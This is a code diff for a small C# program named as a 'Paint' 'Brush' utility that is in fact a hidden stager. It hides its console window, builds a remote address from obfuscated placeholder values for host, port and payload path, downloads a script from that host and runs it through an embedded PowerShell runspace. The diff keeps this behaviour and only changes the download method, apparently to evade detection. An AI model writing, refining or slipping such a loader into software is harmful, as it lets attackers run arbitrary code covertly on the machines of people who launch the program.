@@ -2,25 +2,25 @@ using System.Management.Automation;
 using System.Runtime.InteropServices;
 using System.Net;
 using System;
-
+using System.IO;
 namespace Paint
 {
     class Brush
     {
-	[DllImport("kernel32.dll")]
-	static extern IntPtr GetConsoleWindow();
+    [DllImport("kernel32.dll")]
+  	static extern IntPtr GetConsoleWindow();
 
-	[DllImport("user32.dll")]
-	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
+  	[DllImport("user32.dll")]
+  	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         static void Main()
         {
+        var Console = GetConsoleWindow();
+    		ShowWindow(Console, 0);
+        //System.Threading.Thread.Sleep(60000);        
+    var request = (HttpWebRequest)WebRequest.Create(dec("{http}")+dec("{ip}")+":"+dec("{port}")+dec("{b64_stager}"));
+    var response = (HttpWebResponse)request.GetResponse();
+    var code = new StreamReader(response.GetResponseStream()).ReadToEnd();
 
-		var Console = GetConsoleWindow();
-		ShowWindow(Console, 0);
-
-		WebClient client = new WebClient();
-		String code = client.DownloadString(dec("{http}")+dec("{ip}")+":"+dec("{port}")+dec("{b64_stager}"));
 		PowerShell ps = PowerShell.Create();
 		ps.AddScript(code);
 		ps.Invoke();
@@ -31,7 +31,6 @@ namespace Paint
 
         static string dec(string str)
 {
-
 string base64Decoded;
 byte[] data = System.Convert.FromBase64String(str);
 byte t = 50;
@@ -42,5 +41,6 @@ for (int i = 0; i < data.Length; i++)
     return base64Decoded;
 
 }
+
     }
 }
